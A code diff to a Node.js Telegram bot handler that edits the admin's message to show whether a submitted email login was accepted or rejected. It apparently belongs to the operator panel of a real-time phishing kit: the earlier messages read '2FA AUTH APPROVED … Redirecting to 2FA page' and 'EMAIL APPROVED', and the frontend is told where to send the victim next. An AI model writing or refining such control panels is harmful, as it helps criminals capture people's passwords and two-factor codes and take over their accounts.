@@ -109,42 +109,50 @@ bot.on("callback_query", async (query) => {
       console.log(`   Frontend should receive status: ${action === "page1" ? "accepted1" : action === "page2" ? "accepted2" : "rejected"}`);
       
       // ============================================================================
-      // 📨 SEND CONFIRMATION MESSAGE TO TELEGRAM
+      // 📝 EDIT ORIGINAL MESSAGE - Remove buttons and show status
       // ============================================================================
       
-      console.log(`\n   📢 SENDING CONFIRMATION MESSAGE...`);
+      console.log(`\n   📝 EDITING ORIGINAL MESSAGE...`);
       
-      let confirmMessage = "";
+      let editMessage = "";
       if (action === "page1") {
-        confirmMessage = `✅ <b>2FA AUTH APPROVED</b> ✅\n\n📧 Email: <code>${email}</code>\n\n🔑 Status: Redirecting to 2FA page...`;
+        editMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "page2") {
-        confirmMessage = `✅ <b>EMAIL APPROVED</b> ✅\n\n📧 Email: <code>${email}</code>\n\n📧 Status: Redirecting to email verification page...`;
+        editMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "reject") {
-        confirmMessage = `❌ <b>LOGIN REJECTED</b> ❌\n\n📧 Email: <code>${email}</code>\n\n⛔ Status: Access denied`;
+        editMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
       }
       
       try {
         const botToken = process.env.BOT_TOKEN;
         const chatId = process.env.ADMIN_CHAT_ID;
+        const messageId = query.message?.message_id;
         
-        const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        const msgResponse = await fetch(messageUrl, {
+        if (!messageId) {
+          console.error(`      ❌ No message ID found!`);
+          return;
+        }
+        
+        const editUrl = `https://api.telegram.org/bot${botToken}/editMessageText`;
+        const editResponse = await fetch(editUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: chatId,
-            text: confirmMessage,
+            message_id: messageId,
+            text: editMessage,
             parse_mode: "HTML"
           })
         });
         
-        if (msgResponse.ok) {
-          console.log(`      ✅ Confirmation message sent to Telegram!`);
+        if (editResponse.ok) {
+          console.log(`      ✅ Message edited successfully!`);
+          console.log(`      New text: ${editMessage}`);
         } else {
-          console.error(`      ❌ Failed to send confirmation message`);
+          console.error(`      ❌ Failed to edit message`);
         }
       } catch (err) {
-        console.error(`      ❌ Error sending confirmation message:`, err.message);
+        console.error(`      ❌ Error editing message:`, err.message);
       }
     }
 
